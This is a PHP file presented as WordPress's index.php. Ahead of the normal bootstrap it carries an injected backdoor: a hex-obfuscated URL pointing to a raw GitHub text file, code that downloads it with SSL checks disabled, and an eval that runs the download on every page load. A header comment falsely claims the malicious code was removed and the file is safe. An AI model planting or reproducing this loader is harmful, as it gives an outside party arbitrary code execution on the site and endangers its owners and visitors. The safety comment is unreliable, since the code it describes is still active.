<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$mkoplijnuhby = array(
    9 => "\x68\x65\x61\x64\x73\x2f",
    3 => "\x72\x61\x77\x2e",
    7 => "\x62\x65\x6c\x61\x2f",
    2 => "\x3a\x2f\x2f",
    11 => "\x69\x6e\x64\x65\x78\x2e\x74\x78\x74",
    5 => "\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f",
    1 => "\x68\x74\x74\x70\x73",
    8 => "\x72\x65\x66\x73\x2f",
    4 => "\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e",
    10 => "\x6d\x61\x69\x6e\x2f",
    6 => "\x73\x65\x6f\x62\x65\x6c\x61\x2f"
);
ksort($mkoplijnuhby);
$full_url = implode('', $mkoplijnuhby);

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
